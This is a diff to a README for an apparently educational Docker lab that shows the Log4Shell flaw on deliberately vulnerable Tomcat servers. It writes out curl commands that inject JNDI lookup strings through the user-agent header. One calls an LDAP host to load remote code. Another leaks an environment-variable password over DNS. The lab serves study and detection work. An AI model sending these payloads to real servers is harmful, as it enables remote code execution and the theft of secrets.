@@ -4,11 +4,13 @@
 
 ### Description
 
-This demo Tomcat 8 server has a vulnerable app deployed on it and is also vulnerable via user-agent attacks.
+The demo Tomcat 8 server on port 8080 has a vulnerable app (log4shell) deployed on it and the server also vulnerable via user-agent attacks.
 
 The remote exploit app in this demo is based on that found at https://github.com/kozmer/log4j-shell-poc
 
-This demo tomcat server has been reconfigued to use Log4J2 for logging - a non-standard configuration.
+This demo tomcat server (Tomcat 8.5.3, Java 1.8.0u51) has been reconfigued to use Log4J2 for logging - a non-standard configuration.
+
+A newer Bitnami server is now available on port 8888. It is also is configured for Log4J2 logging and is running Tomcat 9.0.55 and OpenJDK 11.0.13.
 
 The detection script will check for user-agent vulnerablities and is from here: https://gist.github.com/byt3bl33d3r/46661bc206d323e6770907d259e009b6
  
@@ -56,12 +58,12 @@ docker-compose build
 1. In a third terminal, run the following. The second IP is the docker host
     1. `curl -A "\${jndi:ldap://172.16.238.11:1389/a}" http://10.10.10.31:8080/log4shell`
 
-### Run a DNS Exfil Demo
+### Run a DNS Exfil Demo on Recent Java 11 version
 
 1. Start the docker containers in a terminal
     1. `docker-compose up`
 1. In a second terminal, run the following. The IP is the ip address of the docker host
-    1. `curl -A "\${jndi:dns://10.10.10.31/\${env:POC_PASSWORD}}" http://10.10.10.31:8080/log4shell/`
+    1. `curl -A "\${jndi:dns://10.10.10.31/\${env:POC_PASSWORD}}" http://10.10.10.31:8888/log4shell/`
 1. The vulnerable web server will attempt to do a TXT lookup at the given IP. See log4j-dns_exfil.pcap
 
 ### Detect UA Vulnerability
